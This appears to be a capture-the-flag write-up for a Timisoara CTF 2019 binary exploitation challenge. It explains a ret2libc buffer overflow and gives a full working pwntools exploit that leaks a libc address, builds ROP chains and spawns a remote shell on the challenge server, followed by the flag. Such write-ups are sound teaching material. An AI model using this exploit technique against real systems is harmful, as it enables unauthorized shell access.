I"Ô6<p><strong>Category:</strong> Binary Exploitation</p>

<blockquote>
  <p>Our spies found this flag manager service running on the ctf server. It needs a password tho, but I am sure you can handle it.<br />
nc 89.38.208.144 11115</p>
</blockquote>

<p><a href="https://github.com/MiloTruck/CTF-Archive/tree/master/Timisoara%20CTF%202019%20Qualification%20Round/Binary%20Exploitation/Flag%20Manager%20Service%20%5B400%5D" class="btn btn--primary">Challenge Files</a></p>

<h2 id="write-up">Write-up</h2>
<p>Analysis of the binary with Ghidra shows this is a standard ret2libc buffer overflow. <code class="highlighter-rouge">libc-2.27.so</code> being provided reinforces the challenge being a ret2libc.</p>

<p>As usual, all ret2libc exploits have the following order:</p>
<ol>
  <li>
    <p><strong>Leak the address of puts</strong><br />
Leak the address of <code class="highlighter-rouge">puts</code> using <code class="highlighter-rouge">puts</code> to output the address. Essentially, just call <code class="highlighter-rouge">puts(puts_got)</code>, where <code class="highlighter-rouge">puts_got</code> is the address of <code class="highlighter-rouge">puts</code>in the <code class="highlighter-rouge">GLOBAL OFFSET TABLE (GOT)</code>.</p>
  </li>
  <li>
    <p><strong>Calculate the libc base</strong><br />
Libc base can be calculated using <code class="highlighter-rouge">puts</code> - <code class="highlighter-rouge">puts_offset</code>, where <code class="highlighter-rouge">puts</code> is the leaked address and <code class="highlighter-rouge">puts_offset</code> is the address of <code class="highlighter-rouge">puts</code> in libc.</p>
  </li>
  <li>
    <p><strong>Calculate system and /bin/sh address</strong>  <br />
With libc base value, the address of <code class="highlighter-rouge">system</code> and the string <code class="highlighter-rouge">/bin/sh\x00</code> can be calculated using <code class="highlighter-rouge">libc_base + system_offset</code> and <code class="highlighter-rouge">libc_base + binsh_offset</code> respectively.</p>
  </li>
  <li>
    <p><strong>Call system(/bin/sh)</strong><br />
Overflow the buffer and call <code class="highlighter-rouge">system(/bin/sh)</code>, which executes shell. Before calling <code class="highlighter-rouge">system(/bin/sh)</code>, the <code class="highlighter-rouge">RSI</code> register has to be set to 0, or the call will not work.</p>
  </li>
</ol>

<p>Hereâ€™s the final exploit:</p>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
<span class="kn">from</span> <span class="nn">LibcSearcher</span> <span class="kn">import</span> <span class="n">LibcSearcher</span>
<span class="kn">import</span> <span class="nn">sys</span>

<span class="n">config</span> <span class="o">=</span> <span class="p">{</span>
    <span class="s">"elf"</span> <span class="p">:</span> <span class="s">"./flag_manager01"</span><span class="p">,</span>
    <span class="s">"libc"</span> <span class="p">:</span> <span class="s">"./libc-2.27.so"</span><span class="p">,</span>
    <span class="s">"ld"</span> <span class="p">:</span> <span class="s">"./ld-2.27.so"</span><span class="p">,</span>
    <span class="s">"HOST"</span> <span class="p">:</span> <span class="s">"89.38.208.144"</span><span class="p">,</span>
    <span class="s">"PORT"</span> <span class="p">:</span> <span class="mi">11115</span><span class="p">,</span>
<span class="p">}</span>

<span class="k">def</span> <span class="nf">exploit</span><span class="p">(</span><span class="n">p</span><span class="p">):</span>
	<span class="n">padding</span> <span class="o">=</span> <span class="s">"</span><span class="si">\</span><span class="se">x90</span><span class="s">"</span><span class="o">*</span><span class="mi">88</span>
	<span class="n">main</span> <span class="o">=</span> <span class="n">elf</span><span class="p">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">'main'</span><span class="p">]</span>
	<span class="n">puts_got</span> <span class="o">=</span> <span class="n">elf</span><span class="p">.</span><span class="n">got</span><span class="p">[</span><span class="s">'puts'</span><span class="p">]</span>
	<span class="n">puts_plt</span> <span class="o">=</span> <span class="n">elf</span><span class="p">.</span><span class="n">plt</span><span class="p">[</span><span class="s">'puts'</span><span class="p">]</span>

	<span class="n">pop_rdi</span> <span class="o">=</span> <span class="n">elf</span><span class="p">.</span><span class="n">search</span><span class="p">(</span><span class="n">asm</span><span class="p">(</span><span class="s">"pop rdi ; ret"</span><span class="p">)).</span><span class="nb">next</span><span class="p">()</span>
	<span class="n">pop_rsi_r15</span> <span class="o">=</span> <span class="n">elf</span><span class="p">.</span><span class="n">search</span><span class="p">(</span><span class="n">asm</span><span class="p">(</span><span class="s">"pop rsi ; pop r15 ; ret"</span><span class="p">)).</span><span class="nb">next</span><span class="p">()</span>

	<span class="n">payload</span> <span class="o">=</span> <span class="n">padding</span> 
	<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rdi</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">puts_got</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">puts_plt</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">main</span><span class="p">)</span>
	<span class="n">sla</span><span class="p">(</span><span class="s">"Enter your name: "</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>
	<span class="n">sla</span><span class="p">(</span><span class="s">"Enter password please: "</span><span class="p">,</span> <span class="s">''</span><span class="p">)</span> 

	<span class="n">p</span><span class="p">.</span><span class="n">recvline</span><span class="p">()</span>
	<span class="n">p</span><span class="p">.</span><span class="n">recvline</span><span class="p">()</span>

	<span class="n">puts</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">p</span><span class="p">.</span><span class="n">recvline</span><span class="p">().</span><span class="n">strip</span><span class="p">()</span> <span class="o">+</span> <span class="s">'</span><span class="si">\</span><span class="se">x00</span><span class="s">'</span><span class="o">*</span><span class="mi">2</span><span class="p">)</span>
	<span class="n">base</span> <span class="o">=</span> <span class="n">puts</span> <span class="o">-</span> <span class="n">libc</span><span class="p">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">'puts'</span><span class="p">]</span>
	<span class="n">system</span> <span class="o">=</span> <span class="n">base</span> <span class="o">+</span> <span class="n">libc</span><span class="p">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">'system'</span><span class="p">]</span>
	<span class="n">sh</span> <span class="o">=</span> <span class="n">base</span> <span class="o">+</span> <span class="n">libc</span><span class="p">.</span><span class="n">search</span><span class="p">(</span><span class="s">"/bin/sh</span><span class="si">\</span><span class="se">x00</span><span class="s">"</span><span class="p">).</span><span class="nb">next</span><span class="p">()</span>

	<span class="n">payload</span> <span class="o">=</span> <span class="n">padding</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rdi</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">sh</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rsi_r15</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">system</span><span class="p">)</span>

	<span class="n">sla</span><span class="p">(</span><span class="s">"Enter your name: "</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>
	<span class="n">sla</span><span class="p">(</span><span class="s">"Enter password please: "</span><span class="p">,</span> <span class="s">''</span><span class="p">)</span>
	 
	<span class="n">lg</span><span class="p">(</span><span class="s">"SYSTEM: "</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">system</span><span class="p">))</span>
	<span class="n">lg</span><span class="p">(</span><span class="s">"BASE: "</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">base</span><span class="p">))</span>
	<span class="n">p</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>

<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">"__main__"</span><span class="p">:</span>
    <span class="n">elf</span> <span class="o">=</span> <span class="n">context</span><span class="p">.</span><span class="n">binary</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="n">config</span><span class="p">[</span><span class="s">"elf"</span><span class="p">])</span>

    <span class="k">if</span> <span class="s">"libc"</span> <span class="ow">in</span> <span class="n">config</span><span class="p">.</span><span class="n">keys</span><span class="p">()</span> <span class="ow">and</span> <span class="n">config</span><span class="p">[</span><span class="s">"libc"</span><span class="p">]:</span>
        <span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="n">config</span><span class="p">[</span><span class="s">"libc"</span><span class="p">])</span>

    <span class="k">if</span> <span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span> <span class="o">==</span> <span class="s">"remote"</span><span class="p">:</span>
        <span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="n">config</span><span class="p">[</span><span class="s">"HOST"</span><span class="p">],</span> <span class="n">config</span><span class="p">[</span><span class="s">"PORT"</span><span class="p">])</span>
    <span class="k">else</span><span class="p">:</span>
        <span class="k">if</span> <span class="s">"libc"</span> <span class="ow">in</span> <span class="nb">dir</span><span class="p">():</span> 
            <span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">([</span><span class="n">config</span><span class="p">[</span><span class="s">"ld"</span><span class="p">],</span> <span class="n">config</span><span class="p">[</span><span class="s">"elf"</span><span class="p">]],</span> <span class="n">env</span><span class="o">=</span><span class="p">{</span><span class="s">"LD_PRELOAD"</span> <span class="p">:</span> <span class="n">config</span><span class="p">[</span><span class="s">"libc"</span><span class="p">]})</span>
        <span class="k">else</span><span class="p">:</span> 
            <span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="n">config</span><span class="p">[</span><span class="s">"elf"</span><span class="p">])</span>

        <span class="n">pause</span><span class="p">()</span>

    <span class="n">sl</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">a</span><span class="p">:</span> <span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">a</span><span class="p">)</span>
    <span class="n">sla</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">a</span><span class="p">,</span><span class="n">b</span><span class="p">:</span> <span class="n">p</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="n">a</span><span class="p">,</span><span class="n">b</span><span class="p">)</span>
    <span class="n">r</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">a</span><span class="p">:</span> <span class="n">p</span><span class="p">.</span><span class="n">recv</span><span class="p">(</span><span class="n">a</span><span class="p">)</span>
    <span class="n">ru</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">a</span><span class="p">:</span> <span class="n">p</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="n">a</span><span class="p">)</span>
    <span class="n">lg</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">a</span> <span class="p">:</span> <span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="n">a</span><span class="p">)</span>

    <span class="n">exploit</span><span class="p">(</span><span class="n">p</span><span class="p">)</span>
</code></pre></div></div>

<p><strong>Flag:</strong> TIMCTF{d3v_fd_i5_sn3aky_backd00r}</p>
:ET